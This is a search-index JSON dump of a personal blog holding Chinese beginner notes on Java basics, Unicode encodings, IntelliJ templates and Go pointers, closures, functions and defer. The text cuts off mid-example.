&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java运算符","slug":"java00004java运算符","date":"2020-02-03T23:09:34.000Z","updated":"2020-02-04T00:02:38.881Z","comments":true,"path":"2020/02/04/java00004java运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00004java运算符/","excerpt":"","text":"运算符 基本运算符 + - * / % 自增自减 – ++ 复合运算符 += -= *= /= %= 默认会强制类型转换 类型不同运算时,返回的结果为较大范围的类型 123456789101112131415161718192021222324public class test007 &#123; public static void main(String[] args) &#123; int a = 10,b = 20,c = 0; c = a + b; System.out.println(c); c = a - b; System.out.println(c); c = a * b; System.out.println(c); c = a / b; System.out.println(c); c = a % b; System.out.println(c); c += a / a; // c = c + (a / a) System.out.println(c); &#125;&#125; String 字符串类型 String 变量名 字符串 + 字符串 = 拼接字符串 12345678public class test008 &#123; public static void main(String[] args) &#123; String str = \"abc\"; System.out.println(str + \"efg\"); &#125;&#125; 比较运算符 &gt; 大于 &lt; 小于 = 等于 &lt;= 小于等于 &gt;= 等于等于 == 等于 != 不等于 运算结果都是布尔值 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99; isTrue = a &gt; b; System.out.println(isTrue); &#125;&#125; 逻辑运算符 &amp;&amp;(与),||(或),!(非) &amp;&amp; 两个条件为真,结果才为真 || 只要有一个条件为真,结果就为真 ! 真就是假,假就是真 12345678910public class test008 &#123; public static void main(String[] args) &#123; boolean isTrue; int a = 100,b = 99,c = 101; isTrue = a &gt; b &amp;&amp; a &lt; c; System.out.println(isTrue); &#125;&#125; 三元运算符 变量名 = 条件判断 ? 表达式A :表达式B ​ 条件为真返回表达式A,否则返回表达式B ​ 两个表达式类型要和变量类型一致 ​ 运算结果必须被使用 123456789public class test008 &#123; public static void main(String[] args) &#123; int a = 100,b = 99,c; c = (a &gt; b)? a : b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ASCII码-Unicode码","slug":"java00003ASCII码-Unicode码","date":"2020-02-03T22:26:00.000Z","updated":"2020-02-03T23:07:54.372Z","comments":true,"path":"2020/02/04/java00003ASCII码-Unicode码/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00003ASCII码-Unicode码/","excerpt":"","text":"ASCII码 从0到255都是ASCLL码 美国信息交换标准代码(American Standard Code For Information Interchange) Unicode Unicode 编码包含 ASCII 前面127的完全一样 称为万国码 Unicode（统一码、万国码、单一码）于1990年开始研发，1994年正式公布，是计算机领域里一项业界标准，包括字符集，编码方案等。Unicode是为了解决传统字符编码方案的局限而产生的，为每种语言中的每个字符都设定了统一唯一的二进制编码，以实现跨语言、跨平台进行文本转换、处理的要求。 计算机在设计时采用8个比特(bit)作为一个字节(byte)，所以一个字节最多能表示256个字符，早期对于使用英文的西方国家来说，一个字节可以存储大小写英文字母、数学和一些符号，因此使用一个字节来制作码表（ASCII）。后来计算机传到了其他的国家，很多国家都是使用自己的语言，比如中文、日文、韩文…语言复杂了，为了解决这个问题，每个国家制定自己的码表，中国在1980年便制定了GB2312汉字编码字符集，汉字比英文多很多，一个字节明显不够用，所有就使用2个字节来编码。然而不同国家所定义的字符编码虽然可以使用，但是在不同的国家间却经常出现不兼容的情况。如果电脑想处理多语言环境（使用中文或其他语言）可能存在无法同时支持多语言环境。 为了统一所有文字的编码，产生了Unicode,把所有语言的都统一到一套编码里，这样就不会乱码了。 在表示Unicode字符时，通常会用U+然后紧跟一组16进制的数字表示一个字符，在基本多文种平面（第零平面）Basic MultilingualPlane（BMP）里所有的字符都使用4位16进制表示。编码从U+0000到U+FFFF,共支持6万多个字符，在BMP以外的字符则需要使用5位或者6位16进制来表示。 目前Unicode字符分为17组编排，0x0000至0x10FFFF,每组称为平面（Plane）,每个面拥有65536个码位，共1114112个。 Unicode就像一张表，包所有的字符都编写到表中，每一个字符对应一个数字，称为码点（code point）,这个数字一般不直接使用，通过不同的编码方式来使用。 UTF-8、UTF-16、UTF-32就是将数字转换到程序数据的编码方案。UTF是“UnicodeTransformation Format”的缩写，可以翻译成Unicode字符集转换格式，即怎样将Unicode定义的数字转换成程序数据。 UTF-8 UTF-8是以字节位单位对Unicode编码，第0-127位字符使用1个字节来表示，和ASCII编码相同，从128号开始的字符使用2、3、4位字节来表，UTF-8又被称为可变长编码。 UTF-8编码中，使用的是变成的字节序列表示字符，字符对应的代码点（code point）可能使用的是1-4个字节，这样一个字节就是一个代码单元。一个代码点（code point）可能由1-4个代码单元（code unit）组成。 十进制 Unicode编码 UTF-8字节流 0-127位 0x000000-0x00007F 0xxxxxxx(7位) 128-2047位 0x000080-0x0007FF 110xxxxx 10xxxxxx（11位） 2048-65535位 0x000800-0x00FFFF 1110xxxx 10xxxxxx 10xxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx(21位) 比如：“汉”在Unicode中的编码为0x6C49,在表格中的第三行，使用模板为：1110xxxx 10xxxxxx10xxxxxx。将0x6C49转换成二进制：0110 1100 0100 1001，将模板中的x依次替换11100110 10110001 10001001，即E6 B1 89。 UTF-16 UTF-16也是可变长度编码，使用2个或者4个字节来存储字符，但是会浪费存储空间。 UTF-16编码中，字符对应的代码点（code point）可能使用的是2或4个字节，因此2个字节就是一个代码单元（code unit）,一个代码点（codepoint）可由1个或者2个代码单元（code unit）组成。 十进制 Unicode编码 UTF-16字节流 0-65535位 0x000000-0x00FFFF xxxxxxxx xxxxxxxx(16位) 65536-1114111位 0x010000-0x10FFFF 110110yy yyyyyyyy 110111xx xxxxxxxx(20位) 平面0有一个专用区：0xE000-0xF8FF，有6400个码位。平面0的0xD800-0xDFFF，共2048个码位，是一个被称作代理区（Surrogate）的特殊区域。代理区的目的用两个UTF-16字符表示BMP以外的字符。所有大于0x00FFFF的码需要使用代理区的码点。 为了将一个16位无符号整数的UTF-16编码与二个16位无符号整数的UTF-16编码区分开来，Unicode编码的设计者将0xD800-0xDFFF保留下来，并称为代理区（Surrogate）： 十进制 Unicode编码 说明 说明 55296-56191 0xD800－0xDB7F（896个） High Surrogates 高位替代 56192-56913 0xDB80－0xDBFF（128个） High Private Use Surrogates 高位专用替代 56320-57343 0xDC00－0xDFFF（1024个） Low Surrogates 低位替代 增补的16个平面（第2平面-第17平面），范围为：0x010000-0x10FFFF，需要使用2个代理码元表示，第一个码元为0xD800-0xDBFF(高位)范围是:11011000 00000000到11011011 11111111，第二个码元为0xDC00－0xDFFF（低位）范围是：11011100 00000000到11011111 11111111。 目前Unicode最大的码位是0x10FFFF，减去0x010000后最大值为0xFFFFF，完全可以用20位来表示。 把Unicode编码记作U，如果U≥0x10000，我们先计算U’=U-0x10000，然后将U’写成二进制形式：yyyy yyyy yyxx xxxx xxxx，U的UTF-16编码（二进制）就是：110110yyyyyyyyyy110111xxxxxxxxxx 比如：Unicode编码0x20C30，减去0x10000后，得到0x10C30，写成二进制是：0001 0000 1100 0011 0000。用前10位依次替代模板中的y，用后10位依次替代模板中的x，就得到： 1101100001000011 1101110000110000，即0xD8430xDC30。 UTF-32 UTF-32编码以32位无符号整数为单位。Unicode的UTF-32编码就是其对应的32位无符号整数。 UTF-32编码，一个代码点对应4个字节，因此4个字节就是一个代码单元（codeunit）。 十进制 Unicode编码 UTF-32字节流 0-111411位 0x000000-0x10FFFF xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx (32位) 比如：编码0x6C49使用UTF-32编码其结果为：0x00006C49。 字节序 字节序有两种，分别是大端（Big Endian, BE）和小段（Little Endian, LE）。根据字节序的不同，UTF-16实现为UTF-16BE和UTF-16LE，UTF-32实现为UTF-32BE和UTF-32LE。 根据字节序的不同，UTF-16可被实现为UTF-16LE或UTF-16BE，UTF-32可被实现为UTF-32LE或UTF-32BE。 Unicode编码 UTF-16LE UTF-16BE UTF32-LE UTF32-BE 0x006C49 49 6C 6C 49 49 6C 00 00 00 00 6C 49 0x020C30 43 D8 30 DC D8 43 DC 30 30 0C 02 00 00 02 0C 30 Unicode标准建议用BOM（Byte Order Mark）来区分字节序，即在传输字节流前，先传输被作为BOM的字符“零宽无中断空格”。这个字符的编码是FEFF，而反过来的FFFE（UTF-16）和FFFE0000（UTF-32）在Unicode中都是未定义的码位，不应该出现在实际传输中。 UTF编码的BOM： UTF编码 Byte Order Mark (BOM) UTF-8 without BOM 无 UTF-8 with BOM EF BB BF UTF-16LE FF FE UTF-16BE FE FF UTF-32LE FF FE 00 00 UTF-32BE 00 00 FE FF","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"IntelliJ IDEA 中自定义模板代码的缩写","slug":"java IntelliJ-IDEA-中自定义模板代码的缩写","date":"2020-02-03T21:58:59.000Z","updated":"2020-02-03T22:10:30.936Z","comments":true,"path":"2020/02/04/java IntelliJ-IDEA-中自定义模板代码的缩写/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java IntelliJ-IDEA-中自定义模板代码的缩写/","excerpt":"","text":"IntelliJ IDEA 中自定义模板代码的缩写 方法一：新建 Live Template step1. 点击 File – Setting step2. 选择 Live Template，点击右侧的+号，选择 Template Group step3. 输入自定义的名称，然后点击OK。 step4. 选中刚创建的 Template Group，再次点击右侧的+号，选择Live Template step5. 填入缩写词、描述、模版内容、生效文件范围等 配置模板时，变量名以$ $包围的字符的形式出现,调用的方法也是先以变量形式出现，写完模板信息后去编辑变量(Edit variables)。 $END$是一个特殊的预定义变量，表示光标最后跳转的位置。 step6. 点击右边的Edit variables（这个只有在使用了预定义函数的时候才能点击和设置） step7. 点击 Apply ，OK，完成！ 方法二：使用 IDEA 自带的 Live Template psvm 生成 main 方法 fori 生成 for 循环 sout 生成 System.out.println(); … 方法三：修改 IDEA 自带的 Live Template 以将 psvm 修改成 main 和 sout 修改成 syso 为例：","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数据类型转换","slug":"java00002数据类型转换","date":"2020-02-03T20:59:05.000Z","updated":"2020-02-03T22:21:57.550Z","comments":true,"path":"2020/02/04/java00002数据类型转换/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00002数据类型转换/","excerpt":"","text":"数据类型转换 隐式 ​ 代码不需要进行特殊处理,自动处理 ​ 规则:数据范围从小到大 123456789101112public class test006 &#123; public static void main(String[] args) &#123; /*从小到大隐式转换*/ byte a = 1; short c = 3; int d = 4; long e = 5; e = d = c = a; System.out.println(e); &#125;&#125; 显示 ​ (类型名) 数据 ​ (类型名)(数据) ​ 可能发生数据溢出和精度损失 ​ byte/char/short整数运算默认会自动提升为int类型 ​ boolean类型不能发生数据类型转换 1234567891011121314public class test006 &#123; public static void main(String[] args) &#123; /*显示强制转换*/ byte a = 2; int b = 4; a = (byte)(b); System.out.println(a); b = 20; a = (byte)b; System.out.println(a); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"变量","slug":"java00001变量","date":"2020-02-03T20:46:10.000Z","updated":"2020-02-03T20:56:29.796Z","comments":true,"path":"2020/02/04/java00001变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00001变量/","excerpt":"","text":"变量 程序运行期间,内容可以发生改变的值称为变量 先定义后使用 变量声明 数据类型 变量名; 数据类型 变量名 = 初始值; 变量使用 变量名 = 值; 常量有默认类型,如果常量数值大于默认类型,需要手动转换类型 3000000000L 123456789public FileName&#123; public static void main(String[] args) &#123; int a; //变量声明 int b = 1; //变量声明 b = 21; //变量使用 &#125;&#125; 注意事项 ​ 变量名不能重复 ​ float和long类型的字母后缀F和L不能丢 ​ 右侧数值不能超过左侧数据类型范围 ​ 没有赋值的变量不能使用 ​ 变量使用不能超过作用域范围 ​ 作用域：从定义变量的那行起,到直接所属的大括号结束为止 ​ 可以用一条语句创建多个变量","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基础知识","slug":"java基础知识","date":"2020-02-03T03:22:30.000Z","updated":"2020-02-08T09:11:36.411Z","comments":true,"path":"2020/02/03/java基础知识/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java基础知识/","excerpt":"","text":"计算机基础知识 二进制 十进制转二进制 用辗转相除法: 二进制转十进制 用二进制分别乘以位权,在进行相加 存储单位 一般情况下最小单位为bit 1Byte = 8bit 1KB = 1024B 1MB = 1024KB 1GB = 1024MB 1TB = 1024GB 命令提示符 MS-DOS MS代表微软,DOS 代表 Disk Operating System （磁盘操作系统） 磁盘命令 改变磁盘符 直接 输入磁盘符 并按下回车 改变目录 cd 目录 按下tab键会自动补全 cd . . 返回上一层 cd \\ 回到根目录 dir遍历内容 dir . . 遍历上一层内容 dir . 遍历当前目录内容 dir 文件目录 遍历指定目录内容 dir 文件 遍历指定文件 cls 清屏 exit 退出DOS系统","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java编译和运行","slug":"java00000Java编译和运行","date":"2020-02-03T03:22:30.000Z","updated":"2020-02-03T07:22:02.503Z","comments":true,"path":"2020/02/03/java00000Java编译和运行/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java00000Java编译和运行/","excerpt":"","text":"目录: 源文件后缀名 编写java源文件模板 编译和运行 注释 关键字 标识符 常量 数据类型 源文件后缀名 java的源文件后缀名为 *.java 编写java源文件模板 123456public filename&#123; public static void main(String [] args) &#123; System.out.println(\"Hello World.....\"); &#125;&#125; 其中filename对应着源文件名 System.out.println为输出函数 ,输出内容,结尾时换行 编译和运行 编译 javac 文件名 编译成功会生成一个class文件 运行 java 文件名 文件名后面不要带class后缀 注释 // 单行注释 /**/多行注释 1234567891011121314public filename&#123; public static void main(String [] args) &#123; //我是单行注释 /* 我是多行注释 我是多行注释 */ &#125;&#125; 关键字 ​ 特征 ​ 全部小写 ​ 在增强版记事本中有颜色 标识符 命名规则 可以包含字母，数字，下划线，$ 不能以数字开头 标识符不能是关键字 命名规范 类名 大驼峰式 :首字母大写，后面每个单词首字母大写 MyNmae 变量名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 方法名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 常量 程序运行期间，固定不变的量 1234567891011121314151617public filename&#123; public static void mian(String[] args) &#123; String a = \"abc\"; //字符串常量 int iZhengXing = 123; //整型常量 float fXiaoShu = 123.2F; //浮点型常量 char cZifu = 'c'; //字符常量 boolean isBool = true; //布尔型常量 //还有一个null 空常量 &#125;&#125; 数据类型 整型 byte， short， int， long 浮点型 ​ float，double 布尔型 ​ boolean 字符型 ​ char ​ 1234567891011121314151617181920public filename&#123; public static void mian(String[] args) &#123; /***********整型************/ byte bXinBie; //1个字节 short sXiaoZheng; //2个字节 int iRenLei; //4个字节 long lShaZi; //4个字节 /**********浮点型************/ float fFengShu; //4个字节 double dYuanZhouLv; //8个字节 /**********布尔型************/ boolean isOk; /**********字符型************/ char cPingFen; //1个字节 &#125;&#125; 注意事项 ​ 字符串不是基本类型，而是引用类型 ​ 浮点型可能只是一个近似值，并非精确值 ​ 数据范围与字节数不一定相关，例如float数据比long更加广泛，但是float更加广泛 ​ 浮点数默认是double类型，如果要用float类型要加后缀F ​ 整数默认类型是int，如果要用long，后缀要加L","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"个人简历","slug":"个人简历","date":"2019-12-07T10:59:46.000Z","updated":"2019-12-07T10:59:46.442Z","comments":true,"path":"2019/12/07/个人简历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人简历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"个人经历","slug":"个人经历","date":"2019-12-07T10:57:37.000Z","updated":"2019-12-07T10:57:37.110Z","comments":true,"path":"2019/12/07/个人经历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人经历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Golang 指针","slug":"201912050104","date":"2019-12-04T17:05:00.000Z","updated":"2019-12-04T17:06:13.569Z","comments":true,"path":"2019/12/05/201912050104/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/05/201912050104/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121package main/*%T 类型占位符%v 值占位符%p 地址（指针）占位符，只有地址才能替换%p&amp;value 对值取地址*addr 对地址取值**int 指向int型指针的指针作用：函数传参时，传递指针叫引用传递，值传递是拷贝式的，对被传参数的修改是不会改变本体的，想要改变本体只能是引用传递*/import \"fmt\"//指针就是地址//&amp;value 对值取地址//*ptr 对地址取值func main021() &#123; //声明变量a时，系统开辟了一块内存【地址】，里面存的【值】是123 var a int = 123 fmt.Printf(\"a的类型是%T\\n\", a)//int fmt.Printf(\"a的值是%v\\n\", a)//123 fmt.Printf(\"a的地址是%p\\n\", &amp;a)//0x... //&amp;a取变量a的地址 aPointer := &amp;a fmt.Printf(\"aPointer的类型是%T\\n\",aPointer)//*int //将aPointer指向的地址中的值修改为456 *aPointer = 456 fmt.Println(\"*aPointer=\",*aPointer)//456 //a的值就变成了456 fmt.Println(\"a=\",a)&#125;//先定义原始变量，修改其指针中的值，会直接改变原变量//指针如果没有重新赋值，永远指向同一块地址func main022() &#123; //系统给x分配了内存 var x = 456 fmt.Println(x)//456 //定义整型指针（存储整型数据的地址） //默认赋值为空&lt;nil&gt; var xPtr *int fmt.Println(\"xPtr=\", xPtr)//nil //aPtr指向x的地址 xPtr = &amp;x //将xPtr指向的地址中的值修改为789 *xPtr = 789 fmt.Println(x) //789 fmt.Println(xPtr) //0xc042052080 fmt.Println(&amp;x) //0xc042052080 fmt.Println(*xPtr) //789 fmt.Println(*xPtr == x) //true fmt.Println(xPtr == &amp;x) //true var y = 456 *xPtr = y fmt.Println(x) //456 fmt.Println(xPtr) //没有变 fmt.Println(&amp;x) //没有变 fmt.Println(*xPtr) //456 fmt.Println(*xPtr == y) //true fmt.Println(x == y) //true fmt.Println(&amp;x == &amp;y) //false fmt.Println(xPtr == &amp;y) //false fmt.Printf(\"y的地址是%p\\n\",&amp;y) fmt.Println(\"----------\") //xPtr指向y的地址 xPtr = &amp;y y = 789 fmt.Println(x) //456 fmt.Println(y) //789 fmt.Println(*xPtr) //789 fmt.Println(&amp;x == xPtr) //false&#125;//指针是严格检测数据类型的func main023() &#123; var x = 123 var intPtr *int intPtr = &amp;x fmt.Println(intPtr, *intPtr) //0x...,123 //var y = \"你妹\" //intPtr = &amp;y//编译错误，【整型指针】无法赋值为【字符串的地址】&#125;//指针的指针func main024() &#123; var x = 123 var mPtr *int = &amp;x //var mmp **int mmPtr := &amp;mPtr fmt.Println(mmPtr)//0xc042072018 fmt.Printf(\"mmPtr的类型是%T\\n\",mmPtr)//mmPtr的类型是**int //打印x的值 fmt.Println(*mPtr)//123 fmt.Println(*(*mmPtr))//123 fmt.Println(**mmPtr)//123&#125;func test()&#123;&#125;func main() &#123; //main021() //main022() //main023() main024()&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang指针","slug":"Golang指针","permalink":"https://xiaowuyoucy.github.io/tags/Golang指针/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-11-27T08:08:58.620Z","updated":"2019-11-27T08:08:58.620Z","comments":true,"path":"2019/11/27/hello-world/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/27/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new \"My New Post\" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"Golang闭包函数","slug":"201911190628","date":"2019-11-18T22:28:00.000Z","updated":"2019-11-30T17:34:35.064Z","comments":true,"path":"2019/11/19/201911190628/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190628/","excerpt":"","text":"闭包函数 闭包函数概述 闭包函数：返回函数的函数 闭包的好处：【内层函数的状态】被保存在闭包中 不使用闭包，就要开 辟多个全局变量来保存函数以外的数据 如果说这个函数被多方调用，大家都需要各保存各的数据，那么此时就需要开辟多个全局变量 具体使用哪个全局变量，还要在函数内做判断——增大了重复的代码量，令代码看起来比较垃圾 案例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package mainimport \"fmt\"/*李逵和武松的Study方法的逻辑是几乎一模一样的然而为了分别保存二人的学习进度，需要开辟两个全局变量，函数内部需要使用两条分支结构才能完成业务逻辑；如果是108将都来学习...此时代码的可复用性很差！*/var likuiProgress int //0var wusongProgress int //0func Study(name string,hours int) &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) if name==\"李逵\"&#123; likuiProgress += hours &#125;else if name==\"武松\"&#123; wusongProgress += hours &#125;&#125;func main081() &#123; Study(\"李逵\", 5) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",likuiProgress) Study(\"武松\", 15) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",wusongProgress)&#125;/*使用闭包函数优化Study每个人有不同的学习进度，将这个进度保存在【各自的闭包】中*//*闭包函数：返回函数的函数闭包函数的好处：使用同一份内层函数代码，创建出任意多个不同的函数对象，这些对象各自的状态都被保存在函数闭包（外层函数）中，各行其道互不干扰*/func GetStudyFunc(name string) func(hours int) (progress int) &#123; //用于保存内层函数的状态 var progress int //定义内层函数 studyFunc := func(hours int) int &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) //更新内层函数在闭包中的状态 progress += hours return progress &#125; fmt.Printf(\"study的类型是%T\\n\", studyFunc) //返回内层函数 return studyFunc&#125;func main() &#123; //调用闭包函数，得到三个【代码相同的不同函数对象】 studyFunc1 := GetStudyFunc(\"李逵\") studyFunc2 := GetStudyFunc(\"武松\") studyFunc3 := GetStudyFunc(\"鲁智深\") //交替执行这些内层函数，其状态的更新会被其函数闭包所保存 lkProgress := studyFunc1(5) lzsProgress := studyFunc3(17) wsProgress := studyFunc2(15) lkProgress = studyFunc1(3) lzsProgress = studyFunc3(12) lkProgress = studyFunc1(2) wsProgress = studyFunc2(13) //输出结果，三个函数的各自的状态没有互相影响 fmt.Printf(\"李逵的学习进度是%d/10000\\n\",lkProgress) fmt.Printf(\"武松的学习进度是%d/10000\\n\",wsProgress) fmt.Printf(\"鲁智深的学习进度是%d/10000\\n\",lzsProgress)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang闭包函数","slug":"Golang闭包函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang闭包函数/"}]},{"title":"Golang匿名函数","slug":"201911190625","date":"2019-11-18T22:26:00.000Z","updated":"2019-11-18T22:27:43.510Z","comments":true,"path":"2019/11/19/201911190625/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190625/","excerpt":"","text":"匿名函数概述 匿名函数的主要作用是封装一段一次性执行的代码 它无所谓复用，所以无需起名，之所以进行封装的意义，在于使一段代码成为一个整体 defer延时执行一段代码，和go并发执行一段代码是匿名函数的常用场景 123456789101112131415161718//匿名函数func main() &#123;//延时执行的匿名函数defer func() &#123;fmt.Println(\"劳资延时·无名，劳资最后执行\")&#125;()//并发执行的匿名函数go func() &#123;fmt.Println(\"劳资并发·无名，劳资并发执行\")&#125;()//一个带参的匿名函数ret := func(a, b int) int &#123;fmt.Println(\"劳资普通·无名，下面劳资睡一会\")time.Sleep(1)return a + b&#125;(2, 3)fmt.Println(ret)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang匿名函数","slug":"Golang匿名函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang匿名函数/"}]},{"title":"函数","slug":"201911190615","date":"2019-11-18T22:15:00.000Z","updated":"2019-11-18T22:23:31.611Z","comments":true,"path":"2019/11/19/201911190615/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190615/","excerpt":"","text":"函数概述 函数是对一段能够重复使用的代码的封装 函数的参数定义了外界给函数输入的数据 函数的返回值定义了函数给外界输出的数据 Go语言函数支持不定长参数和多个返回值 @函数定义和调用 123456//定义函数func sayHello() &#123;fmt.Println(\"fuck off!\")&#125;//调用函数sayHello() @函数参数 无参函数 123func add0() &#123;fmt.Println(\"没参数，add你妹啊\")&#125; 带参函数 1234func add1(a int) &#123;fmt.Println(\"收到一个参数\", a)fmt.Println(\"一个参数，add你妹啊\")&#125; 多个参数 123456789101112//多个参数func addm1(a int, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型相同的参数被合写在一起了func addm2(a, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型不同的参数func addm3(a, b int, c float32) &#123;fmt.Println(\"加和是\", float32(a)+float32(b)+c)&#125; 不定长参数 1234567891011121314func addx(x ...int) &#123;//参数的长度是 5fmt.Println(\"参数的长度是\", len(x))//参数的类型是[]intfmt.Printf(\"参数的类型是%T\\n\", x)var result = 0//遍历不定长参数for i, v := range x &#123;fmt.Println(i, v)result += v&#125;//加和是 15fmt.Println(\"加和是\", result)&#125; @函数返回值 无返回值 1234//无返回值func sub0(a, b int) &#123;fmt.Println(\"相减的结果是\", a-b)&#125; 有返回值 12345678910//有返回值func sub11(a, b int) int &#123;fmt.Println(\"相减的结果是\", a-b)return a - b&#125;func sub12(a, b int) (ret int) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - breturn&#125; 多个返回值 1234567891011//多个返回值func subm1(a, b int) (int, string) &#123;fmt.Println(\"相减的结果是\", a-b)return a - b, \"你妹\"&#125;func subm2(a, b int) (ret int, remark string) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - bremark = \"你妹\"return&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang函数","slug":"Golang函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang函数/"}]},{"title":"Golang延时执行defer","slug":"201911190306","date":"2019-11-18T19:09:00.000Z","updated":"2019-11-18T19:21:46.056Z","comments":true,"path":"2019/11/19/201911190306/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190306/","excerpt":"","text":"defer概述 defer xxx() 延时执行，将xxx放在函数的最后执行 多个defer xxx()时,所有defer倒序执行，即最早声明 的defer会最后执行 用途 (数据库读写，文件读写，网络数据读写) 资源=数据库连接，打开的文件对象，网路连接 资源开销（CPU，内存，磁盘…）巨大 资源，随用随开，用完【即】关 场景 O只是场景之一 其它场景：消费完毕要买单，运动完要洗澡，自习结束要关灯… 读写数据库，并在程序的最后关闭数据库 12345678func demo41() &#123;//随用随开，用完【即】关fmt.Println(\"打开数据库\")//defer所唤起的函数将在函数结束前才执行defer closeDatabase()fmt.Println(\"愉快地读写数据\")fmt.Println(\"读写完毕\")&#125; 多个defer时，最早defer的操作最后执行 12345678910111213141516171819202122func demo42() &#123;//打开数据库fmt.Println(\"打开数据库\")defer closeDatabase()//读入DB数据fmt.Println(\"读入DB数据\")//打开文件fmt.Println(\"打开文件\")defer closeFile()//向文件中写出DB中的数据fmt.Println(\"读入DB数据\")//关闭文件//继续操作数据库fmt.Println(\"继续操作数据库\")//关闭数据库&#125;func closeDatabase() &#123;fmt.Println(\"关闭数据库\")&#125;func closeFile() &#123;fmt.Println(\"关闭文件\")&#125; 其他defer案例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport \"fmt\"func xingzuoZhensuo() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\" &#123; fmt.Println(\"阁下真乃神人也\") &#125; else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\" &#123; fmt.Println(\"阁下是天秤座\") &#125; else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\" &#123; fmt.Println(\"阁下是天蝎座\") &#125; else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\" &#123; fmt.Println(\"阁下是射手座\") &#125; else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday &gt;= \"0101\" &amp;&amp; birthday &lt;= \"0122\") &#123; fmt.Println(\"阁下是摩羯座\") &#125; else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\" &#123; fmt.Println(\"阁下是水瓶座\") &#125; else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\") || (birthday &gt;= \"0301\" &amp;&amp; birthday &lt;= \"0322\") &#123; fmt.Println(\"阁下是双鱼座\") &#125; else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\" &#123; fmt.Println(\"阁下是白羊座\") &#125; else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\" &#123; fmt.Println(\"阁下是金牛座\") &#125; else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\" &#123; fmt.Println(\"阁下是双子座\") &#125; else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= 